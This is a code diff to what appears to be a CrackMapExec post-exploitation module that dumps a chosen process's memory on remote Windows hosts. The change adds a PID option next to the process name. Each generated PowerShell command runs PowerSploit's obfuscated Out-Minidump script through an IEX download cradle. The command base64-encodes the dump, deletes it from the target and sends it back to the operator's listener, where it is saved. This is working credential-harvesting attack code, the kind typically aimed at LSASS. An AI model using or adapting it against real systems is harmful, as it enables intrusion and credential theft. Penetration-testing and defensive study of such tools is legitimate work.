@@ -11,15 +11,20 @@ class CMEModule:
     opsec_safe= False # The module touches disk with the output of the memory dump
     multiple_hosts = True
 
+    process_name = None
+    process_id = None
+
     def options(self, context, module_options):
         '''
            PROCESS      The name of the process for which a dump will be generated
            DUMP_PATH    The path where dump files will be written
         '''
         if module_options and 'PROCESS' in module_options:
-            self.process = module_options['PROCESS']
+            self.process_name = module_options['PROCESS']
+        elif module_options and 'PID' in module_options:
+            self.process_id = module_options['PID']
         else:
-            context.log.error('PROCESS option is required!')
+            context.log.error('PROCESS or PID option is required!')
             exit(1)
 
         if module_options and 'DUMP_PATH' in module_options:
@@ -30,7 +35,10 @@ class CMEModule:
         self.ps_script = obfs_ps_script('powersploit/Exfiltration/Out-Minidump.ps1')
 
     def on_admin_login(self, context, connection):
-        command = "$($res = Out-Minidump (Get-Process '{}') {};$content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($res.FullName));Remove-Item $res.FullName;$content)".format(self.process, self.dump_path, self.dump_path, self.dump_path)
+        if self.process_name:
+            command = "$($res = Out-Minidump (Get-Process -Name '{}') {};$content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($res.FullName));Remove-Item $res.FullName;$content)".format(self.process_name, self.dump_path, self.dump_path, self.dump_path)
+        elif self.process_id:
+            command = "$($res = Out-Minidump (Get-Process -Id '{}') {};$content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($res.FullName));Remove-Item $res.FullName;$content)".format(self.process_id, self.dump_path, self.dump_path, self.dump_path)
         launcher = gen_ps_iex_cradle(context, 'Out-Minidump.ps1', command)
 
         connection.ps_execute(launcher)
@@ -56,7 +64,11 @@ class CMEModule:
         response.stop_tracking_host()
 
         if len(data):
-            log_name = '{}-{}-{}.dmp'.format(self.process, response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
+            if self.process_name:
+                log_name = '{}-{}-{}.dmp'.format(self.process_name, response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
+            elif self.process_id:
+                log_name = '{}-{}-{}.dmp'.format(self.process_id, response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
+
             with open(log_name, 'wb') as key_file:
                 key_file.write(base64.b64decode(data))
                 context.log.info("Saved Out-Minidump output to {}".format(log_name))
